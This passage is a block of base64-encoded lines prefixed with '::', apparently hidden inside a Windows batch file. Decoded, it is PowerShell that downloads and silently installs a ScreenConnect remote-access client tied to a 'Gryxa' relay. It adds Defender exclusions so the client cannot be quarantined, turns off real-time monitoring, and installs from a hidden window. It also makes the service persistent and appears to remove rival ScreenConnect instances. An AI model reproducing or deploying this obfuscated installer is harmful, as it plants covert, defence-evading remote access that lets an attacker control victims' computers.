::eSB7DQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::ICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1
::IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHUgMj4mMSB8IE91dC1OdWxsDQogICAg
::ICAgICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0ZW0gJHRt
::cCkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgew0KICAgICAgICAgICAgICAgICRleHAg
::PSBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnAgfSBlbHNlIHsgJycgfQ0KICAgICAgICAgICAgICAgIGlmICgtbm90
::IChUZXN0LU1zaVBhY2thZ2UgJHRtcCAkZXhwKSkgeyBjb250aW51ZSB9DQogICAg
::ICAgICAgICAgICAgdHJ5IHsgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1E
::ZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU3RvcDsgcmV0dXJu
::ICRtc2kgfSBjYXRjaCB7IHJldHVybiAkdG1wIH0NCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICBpZiAoVGVzdC1QYXRoICR0bXAp
::IHsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0K
::ZnVuY3Rpb24gQWRkLVNjRGVmZW5kZXJFeGNsdXNpb24oW3N0cmluZ10kRnApIHsN
::CiAgICAjIEV4Y2x1ZGUgdGhpcyBGUCdzIFNDIGRpcnMgKHdpbGRjYXJkICsgZXhw
::bGljaXQpIHNvIFJUTSBjYW4ndCBxdWFyYW50aW5lIHRoZQ0KICAgICMgY2xpZW50
::IG9uIGluc3RhbGwuIFJlLWFzc2VydGVkIGJlZm9yZSBldmVyeSBpbnN0YWxsL21p
::Z3JhdGUg4oCUIHN1cnZpdmVzIEZQIHJvdGF0aW9ucy4NCiAgICB0cnkgew0KICAg
::ICAgICAkbmFtZXMgPSBAKCJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZwKSIsICdT
::Y3JlZW5Db25uZWN0IENsaWVudConKQ0KICAgICAgICBmb3JlYWNoICgkYmFzZSBp
::biBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMp
::KSB7DQogICAgICAgICAgICBpZiAoLW5vdCAkYmFzZSkgeyBjb250aW51ZSB9DQog
::ICAgICAgICAgICBmb3JlYWNoICgkbiBpbiAkbmFtZXMpIHsgQWRkLU1wUHJlZmVy
::ZW5jZSAtRXhjbHVzaW9uUGF0aCAoSm9pbi1QYXRoICRiYXNlICRuKSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgIH0NCiAgICAgICAgQWRk
::LU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAnU2NyZWVuQ29ubmVjdC5D
::bGllbnRTZXJ2aWNlLmV4ZScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAnU2Ny
::ZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZScgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICAgICAgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJl
::YWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIH0gY2F0Y2gge30NCn0NCg0KZnVuY3Rpb24gQ29udmVydFRvLVBh
::Y2tlZEd1aWQoW3N0cmluZ10kR3VpZCkgew0KICAgICMgV2luZG93cyBJbnN0YWxs
::ZXIgc3RvcmVzIFByb2R1Y3RDb2RlcyB3aXRoIHJldmVyc2VkIHNlZ21lbnRzIChw
::YWNrZWQvc3F1aXNoZWQgR1VJRCkuDQogICAgJGcgPSAkR3VpZC5UcmltKCd7fScp
::LlJlcGxhY2UoJy0nLCAnJykNCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5U
::ZXh0LlN0cmluZ0J1aWxkZXINCiAgICAjIGZpcnN0IDMgc2VnbWVudHMgcmV2ZXJz
::ZWQgcGVyLWNoYXIsIGxhc3QgMiBzZWdtZW50cyByZXZlcnNlZCBwZXItYnl0ZS1w
::YWlyDQogICAgJHNlZ3MgPSBAKCRnLlN1YnN0cmluZygwLDgpLCAkZy5TdWJzdHJp
::bmcoOCw0KSwgJGcuU3Vic3RyaW5nKDEyLDQpLCAkZy5TdWJzdHJpbmcoMTYsNCks
::ICRnLlN1YnN0cmluZygyMCwxMikpDQogICAgZm9yICgkaT0wOyAkaSAtbHQgMzsg
::JGkrKykgeyAkYyA9ICRzZWdzWyRpXS5Ub0NoYXJBcnJheSgpOyBbYXJyYXldOjpS
::ZXZlcnNlKCRjKTsgW3ZvaWRdJHNiLkFwcGVuZCgtam9pbiAkYykgfQ0KICAgIGZv
::ciAoJGk9MzsgJGkgLWx0IDU7ICRpKyspIHsgJHMgPSAkc2Vnc1skaV07IGZvciAo
::JGo9MDsgJGogLWx0ICRzLkxlbmd0aDsgJGorPTIpIHsgW3ZvaWRdJHNiLkFwcGVu
::ZCgkc1skaisxXSk7IFt2b2lkXSRzYi5BcHBlbmQoJHNbJGpdKSB9IH0NCiAgICBy
::ZXR1cm4gJHNiLlRvU3RyaW5nKCkuVG9VcHBlcigpDQp9DQoNCmZ1bmN0aW9uIFJl
::bW92ZS1JbnN0YWxsZXJQcm9kdWN0UmVnaXN0cmF0aW9uKFtzdHJpbmddJFByb2R1
::Y3RDb2RlKSB7DQogICAgIyBQdXJnZSBhIHBoYW50b20vY29ycnVwdCBQcm9kdWN0
::Q29kZSBmcm9tIHRoZSBJbnN0YWxsZXIgZGF0YWJhc2UgKEluc3RhbGxlZD0wMDow
::MDowMA0KICAgICMgcmVnaXN0cmF0aW9ucyB0aGF0IHN1cnZpdmUgQVJQIHJlbW92
::YWwgYW5kIG1ha2UgL2kgZmFpbCAxNjAzIGluIG1haW50ZW5hbmNlIG1vZGUpLg0K
::ICAgIGlmICgtbm90ICRQcm9kdWN0Q29kZSkgeyByZXR1cm4gfQ0KICAgICRwYWNr
::ZWQgPSBDb252ZXJ0VG8tUGFja2VkR3VpZCAkUHJvZHVjdENvZGUNCiAgICAka2V5
::cyA9IEAoDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxDbGFzc2VzXEluc3RhbGxl
::clxQcm9kdWN0c1wkcGFja2VkIiwNCiAgICAgICAgIkhLTE06XFNPRlRXQVJFXE1p
::Y3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEluc3RhbGxlclxVc2VyRGF0
::YVxTLTEtNS0xOFxQcm9kdWN0c1wkcGFja2VkIiwNCiAgICAgICAgIkhLTE06XFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFs
::bFwkUHJvZHVjdENvZGUiLA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcV09XNjQz
::Mk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs
::XCRQcm9kdWN0Q29kZSINCiAgICApDQogICAgZm9yZWFjaCAoJGsgaW4gJGtleXMp
::IHsNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGspIHsgUmVt
::b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRrIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgfQ0KICAgICYgcmVnLmV4ZSBk
::ZWxldGUgIkhLQ1JcSW5zdGFsbGVyXFByb2R1Y3RzXCRwYWNrZWQiIC9mIDI+JjEg
::fCBPdXQtTnVsbA0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Hcnl4YUluc3RhbGwoW3N0
::cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kRnAsIFtzdHJpbmddJExvZ0ZpbGUpIHsN
::CiAgICAjIEw0NDogbmV2ZXIgaW50ZXJydXB0IGFueSBsaXZlIEdyeXhhOyBuZXZl
::ciAvaSB3aGlsZSB0aGlzIEZQJ3Mgc2VydmljZSBleGlzdHM7IG5ldmVyIGRlZmVy
::cmVkIC94Lg0KICAgIGlmIChGaW5kLVJ1bm5pbmdHcnl4YUZwKSB7IHJldHVybiB9
::DQogICAgaWYgKCRGcCAtYW5kIChUZXN0LVNjUnVubmluZyAkRnApKSB7IHJldHVy
::biB9DQogICAgaWYgKCRGcCAtYW5kIChUZXN0LVNjU2VydmljZUV4aXN0cyAkRnAp
::KSB7DQogICAgICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnAp
::Ig0KICAgICAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEg
::fCBPdXQtTnVsbA0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgQWRkLVNjRGVm
::ZW5kZXJFeGNsdXNpb24gJEZwDQogICAgJHNhZmVNc2kgPSBQcm90ZWN0LU1zaVNp
::YmxpbmdTYWZlICRNc2lQYXRoDQogICAgaWYgKC1ub3QgJHNhZmVNc2kpIHsgcmV0
::dXJuIH0gICMgcmVmdXNlIGluc3RhbGwgaWYgVXBncmFkZSBjYW5ub3QgYmUgY2xl
::YXJlZA0KICAgICRwYyA9IEdldC1Nc2lQcm9wZXJ0eSAkc2FmZU1zaSAnUHJvZHVj
::dENvZGUnDQogICAgJGNtZCA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfaW5z
::dGFsbC5jbWQnDQogICAgJHN2Y05hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCRGcCkiDQogICAgJGxpbmVzID0gQCgnQGVjaG8gb2ZmJykNCiAgICAkbGluZXMg
::Kz0gJ3JlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
::bmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAw
::IC9mID5udWwgMj4mMScNCiAgICAjIEw0NCBydW50aW1lIGd1YXJkIGluIGRlZmVy
::cmVkIGNtZCDigJQgYWJvcnQgaWYgR3J5eGEgYXBwZWFyZWQgc2luY2Ugd3JhcHBl
::ciB3YXMgd3JpdHRlbg0KICAgICRsaW5lcyArPSAic2MgcXVlcnkgYCIkc3ZjTmFt
::ZWAiID5udWwgMj4mMSINCiAgICAkbGluZXMgKz0gJ2lmIG5vdCBlcnJvcmxldmVs
::IDEgKHNjIHN0YXJ0ICInICsgJHN2Y05hbWUgKyAnIiA+bnVsIDI+JjEgJiBleGl0
::IC9iIDApJw0KICAgICRsaW5lcyArPSAnc2MgcXVlcnkgc3RhdGU9IGFsbCB8IGZp
::bmRzdHIgL0kgL0M6IicgKyAkRnAgKyAnIiA+bnVsJw0KICAgICRsaW5lcyArPSAn
::aWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAnDQogICAgIyBubyBtc2lleGVj
::IC94IGV2ZXIgaW4gZGVmZXJyZWQgd3JhcHBlciAoVE9DVE9VIGtpbGxlZCBsaXZl
::IEd1ZXN0KQ0KICAgIGlmICgkcGMpIHsNCiAgICAgICAgJGxpbmVzICs9ICJyZWcg
::ZGVsZXRlIGAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50
::VmVyc2lvblxVbmluc3RhbGxcJHBjYCIgL2YgPm51bCAyPiYxIg0KICAgICAgICAk
::bGluZXMgKz0gInJlZyBkZWxldGUgYCJIS0xNXFNPRlRXQVJFXFdPVzY0MzJOb2Rl
::XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwkcGNg
::IiAvZiA+bnVsIDI+JjEiDQogICAgfQ0KICAgICRsaW5lcyArPSAibXNpZXhlYyAv
::aSBgIiRzYWZlTXNpYCIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9
::UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRMb2dGaWxlYCIiDQogICAgJGxpbmVzICs9
::ICJzYyBjb25maWcgYCIkc3ZjTmFtZWAiIHN0YXJ0PSBhdXRvIg0KICAgICRsaW5l
::cyArPSAic2MgZmFpbHVyZSBgIiRzdmNOYW1lYCIgcmVzZXQ9IDg2NDAwIGFjdGlv
::bnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwIg0KICAg
::ICRsaW5lcyArPSAic2Mgc3RhcnQgYCIkc3ZjTmFtZWAiIg0KICAgIGZvcmVhY2gg
::KCRzayBpbiAoR2V0LVNldnJ6S2VlcCkpIHsNCiAgICAgICAgJGxpbmVzICs9ICJz
::YyBjb25maWcgYCJTY3JlZW5Db25uZWN0IENsaWVudCAoJHNrKWAiIHN0YXJ0PSBh
::dXRvID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVzICs9ICJzYyBzdGFydCBgIlNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICgkc2spYCIgPm51bCAyPiYxIg0KICAgIH0NCiAg
::ICAkcmVzdWx0RmlsZSA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfaW5zdGFs
::bC5yZXN1bHQnDQogICAgJGxpbmVzICs9ICJlY2hvICVFUlJPUkxFVkVMJT5gIiRy
::ZXN1bHRGaWxlYCIiDQogICAgJGxpbmVzICs9ICJkZWwgL2YgL3EgYCIkc2FmZU1z
::aWAiID5udWwgMj4mMSINCiAgICAkbGluZXMgKz0gImRlbCAvZiAvcSBgIiRjbWRg
::IiA+bnVsIDI+JjEiDQogICAgJGxpbmVzICs9ICdleGl0Jw0KICAgIFNldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkY21kIC1WYWx1ZSAkbGluZXMgLUVuY29kaW5nIEFT
::Q0lJIC1Gb3JjZQ0KICAgIFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRM
::aXN0ICIvYyBgIiRjbWRgIiIgLVdpbmRvd1N0eWxlIEhpZGRlbg0KfQ0KDQpmdW5j
::dGlvbiBNYXJrLUdyeXhhUmVpbnN0YWxsIHsNCiAgICBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZs
::YWcnKSAtVmFsdWUgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmlu
::ZygnbycpIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCn0NCg0KZnVuY3Rpb24gR2V0
::LUdyeXhhTWlncmF0ZU9sZFBhdGggeyBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhh
::X21pZ3JhdGVfb2xkLnR4dCcgfQ0KDQpmdW5jdGlvbiBTYXZlLUdyeXhhTWlncmF0
::ZU9sZChbc3RyaW5nW11dJE9sZEZwcywgW3N0cmluZ10kTmV3RnApIHsNCiAgICAk
::b2xkcyA9IEAoJE9sZEZwcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgKCRfIC1u
::ZSAkTmV3RnApIH0gfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpDQogICAgaWYgKC1u
::b3QgJG9sZHMuQ291bnQpIHsNCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
::YXRoIChHZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkgLUZvcmNlIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICBT
::ZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YU1pZ3JhdGVPbGRQYXRo
::KSAtVmFsdWUgJG9sZHMgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0KfQ0KDQpmdW5j
::dGlvbiBDb21wbGV0ZS1Hcnl4YU1pZ3JhdGVPbGQgew0KICAgICMgTDQ0OiBORVZF
::UiBhdXRvLXVuaW5zdGFsbCBvbGQgR3J5eGEgRlAg4oCUIHRoYXQgZHJvcHBlZCBs
::aXZlIEd1ZXN0cyBzdGlsbCBvbiBvbGQgRlAuDQogICAgIyBLZWVwIHRoZSBmbGFn
::IGZvciB2aXNpYmlsaXR5OyBvcGVyYXRvci9tYW51YWwgY2xlYW51cCBvbmx5Lg0K
::ICAgICRwID0gR2V0LUdyeXhhTWlncmF0ZU9sZFBhdGgNCiAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkpIHsgcmV0dXJuIH0NCiAgICAkbG9n
::ID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1cmUubG9nJw0KICAgIEFk
::ZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoJ3swfSBtaWdyYXRl
::X2NsZWFudXBfU0tJUFBFRF9MNDQgKGtlZXAgZHVhbC1GUDsgbmV2ZXIgL3ggbGl2
::ZSBHcnl4YSknIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1t
::OnNzJykpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRwIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Hcnl4YU1pZ3JhdGUoW3N0
::cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kTmV3RnAsIFtzdHJpbmdbXV0kT2xkRnBz
::LCBbc3RyaW5nXSRSZWFzb24pIHsNCiAgICAjIEw0Mjogc2libGluZy1zYWZlIC9p
::IG9mIE5ld0ZwIEZJUlNUIOKAlCBrZWVwIE9sZEZwcyBSdW5uaW5nIHVudGlsIENv
::bXBsZXRlLUdyeXhhTWlncmF0ZU9sZC4NCiAgICBTYXZlLUdyeXhhTWlncmF0ZU9s
::ZCAkT2xkRnBzICROZXdGcA0KICAgIENsZWFyLUdyeXhhQXJwICROZXdGcA0KICAg
::IFNldC1Hcnl4YUZwICROZXdGcA0KICAgIFN0YXJ0LUdyeXhhSW5zdGFsbCAkTXNp
::UGF0aCAkTmV3RnAgKEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2RldGFj
::aGVkLmxvZycpDQogICAgTWFyay1Hcnl4YVJlaW5zdGFsbA0KICAgIHJldHVybiAi
::SU5GTElHSFR8JE5ld0ZwfCRSZWFzb24iDQp9DQoNCmZ1bmN0aW9uIEludm9rZS1H
::cnl4YUVuc3VyZSB7DQogICAgIyBMNDYgRlJFRVpFOiBuZXZlciBtc2lleGVjIGZy
::b20gbW9uL2Jvb3QvZm9yY2UtZmxhZy4gU3RhcnQtb25seS4gTWFudWFsIG93bl9n
::cnl4YV9mb3JjZSBmb3IgaW5zdGFsbC4NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRo
::IC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsgTmV3LUl0ZW0gLUl0ZW1UeXBlIERp
::cmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbCB9DQogICAg
::JGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfZW5zdXJlLmxvZycNCiAg
::ICBmdW5jdGlvbiBHTG9nKFtzdHJpbmddJG0pIHsgQWRkLUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRsb2cgLVZhbHVlICgnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3Jt
::YXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0pIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlIH0NCg0KICAgIGZvcmVhY2ggKCRzdGFsZSBpbiBAKCdncnl4
::YV9pbnN0YWxsLmNtZCcsICdncnl4YV9tc2kubG9jaycsICdvd25fZ3J5eGEubG9j
::aycpKSB7DQogICAgICAgICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICRzdGFsZQ0K
::ICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAg
::ICAgICAgR0xvZyAibDQ2X2Fib3J0X3N0YWxlICRzdGFsZSINCiAgICAgICAgICAg
::IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkcCAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICRmcCA9
::IEdldC1Hcnl4YUZwDQogICAgJGV4cCA9ICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZw
::DQogICAgaWYgKC1ub3QgJGV4cCkgeyAkZXhwID0gJGZwIH0NCg0KICAgICRydW5u
::aW5nID0gRmluZC1SdW5uaW5nR3J5eGFGcA0KICAgIGlmICgkcnVubmluZykgew0K
::ICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZw0KICAgICAgICBHTG9nICJsNDZf
::bGl2ZV9vayBmcD0kcnVubmluZyBmb3JjZT0kRm9yY2UgZGVlcD0kRGVlcCINCiAg
::ICAgICAgaWYgKCREZWVwKSB7DQogICAgICAgICAgICAkdGNwUiA9IFRlc3QtVGNw
::SG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0NDMNCiAgICAgICAgICAg
::ICR0Y3BVID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0
::Mw0KICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nfHJ1bm5pbmc9
::MXxkZWVwPTF8cmVsYXk9JHRjcFJ8dWk9JHRjcFV8ZnJlZXplPTEiDQogICAgICAg
::IH0NCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRydW5uaW5nfHJ1bm5pbmc9MXxm
::cmVlemU9MSINCiAgICB9DQoNCiAgICBmb3JlYWNoICgkdHJ5RnAgaW4gQCgkZXhw
::LCAkZnApIHwgV2hlcmUtT2JqZWN0IHsgJF8gfSB8IFNlbGVjdC1PYmplY3QgLVVu
::aXF1ZSkgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1TY1NlcnZpY2VFeGlzdHMg
::JHRyeUZwKSkgeyBjb250aW51ZSB9DQogICAgICAgICRuYW1lID0gIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICgkdHJ5RnApIg0KICAgICAgICBHTG9nICJsNDZfc3RhcnRf
::b25seSBmcD0kdHJ5RnAiDQogICAgICAgICYgc2MuZXhlIGNvbmZpZyAkbmFtZSBz
::dGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBzYy5leGUgc3Rh
::cnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1T
::ZWNvbmRzIDUNCiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5nICR0cnlGcCkgew0K
::ICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHRyeUZwDQogICAgICAgICAgICByZXR1
::cm4gIkhFQUxUSFl8JHRyeUZwfHN0YXJ0ZWQ9MXxmcmVlemU9MSINCiAgICAgICAg
::fQ0KICAgIH0NCg0KICAgIEdMb2cgImw0Nl9hYnNlbnRfbm9fYXV0b19pbnN0YWxs
::IHRhcmdldD0kZXhwIg0KICAgIHJldHVybiAiVU5IRUFMVEhZfCRleHB8YWJzZW50
::LWZyZWV6ZS1uby1pbnN0YWxsIg0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtRXh0ZXJt
::aW5hdGUgew0KICAgICMgTDQ1OiBIQU5EUy1PRkYg4oCUIGRvIG5vdCB0b3VjaCBh
::bnkgU2NyZWVuQ29ubmVjdCB3aGlsZSBkaWFnbm9zaW5nIGRpc2Nvbm5lY3RzLg0K
::ICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVybWluYXRlLmxvZycN
::CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCd7MH0g
::ZXh0ZXJtaW5hdGVfU0tJUFBFRF9MNDUgaGFuZHMtb2ZmLWFsbC1zYycgLWYgKEdl
::dC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSkgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUNCiAgICByZXR1cm4gJ1NLSVB8aGFuZHMtb2Zm
::LXNjLUw0NScNCiAgICAjIEw3OiB0cnVlIHJlbW92YWwgKGRpc2FibGVkKS4uLg0K
::ICAgICRydW5uaW5nRyA9IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICBpZiAoJHJ1
::bm5pbmdHKSB7IFNldC1Hcnl4YUZwICRydW5uaW5nRyB9DQogICAgJGtlZXAgPSBA
::KEdldC1LZWVwRmluZ2VycHJpbnRzKQ0KICAgICRuID0gQHsgc3ZjID0gMDsgcHJv
::YyA9IDA7IGRpciA9IDA7IHByb2R1Y3QgPSAwOyBybW0gPSAwOyBmYWlsID0gMCB9
::DQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsNCiAgICAgICAgJGxpbmUg
::PSAnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6
::bW06c3MnKSwgJG0NCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRs
::b2cgLVZhbHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
::ICAgICAgICMgTzQxOiBkbyBOT1QgV3JpdGUtT3V0cHV0IExvZyBsaW5lcyAocG9s
::bHV0ZXMgZm9yIC9mIGNhbGxlcnMpDQogICAgfQ0KICAgICMgUHJvdGVjdCBHcnl4
::YSBkdXJpbmcgc3RhcnQgcmFjZTogb25seSBsaXZlIFNDIHByb2NzIHdpdGggdmVy
::aWZpZWQgR3J5eGEgcmVsYXkvRlANCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
::UHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICRibG9iID0gIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChb
::c3RyaW5nXSRfLkNvbW1hbmRMaW5lKSINCiAgICAgICAgaWYgKCRibG9iIC1tYXRj
::aCAnU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykg
::ew0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAg
::ICAgICAgICBpZiAoJGZwIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCAtYW5kIChU
::ZXN0LUlzR3J5eGFGcCAkZnApIC1hbmQgJGZwIC1ub3RpbiAka2VlcCkgew0KICAg
::ICAgICAgICAgICAgICRrZWVwICs9ICRmcA0KICAgICAgICAgICAgICAgIFNldC1H
::cnl4YUZwICRmcA0KICAgICAgICAgICAgICAgIExvZyAia2VlcF9hZGRfZnJvbV9w
::cm9jIGZwPSRmcCINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAg
::ICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgew0KICAgICAgICBpZiAo
::LW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAgICAgIyBhbGxvdyBpZiBy
::ZWxheSBzZXJ2ZXIvZG9tYWluIGlzIEdyeXhhIE9SIGZpbmdlcnByaW50IGlzIGEg
::a2VlcGVyDQogICAgICAgIGlmICgkcyAtbWF0Y2ggJyg/aSlncnl4YVwuY29tJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkg
::eyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCiAgICBmdW5jdGlvbiBGb3JjZS1SZW1v
::dmVEaXIoW3N0cmluZ10kZCkgew0KICAgICAgICBpZiAoLW5vdCAkZCAtb3IgLW5v
::dCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgcmV0dXJuICR0cnVlIH0N
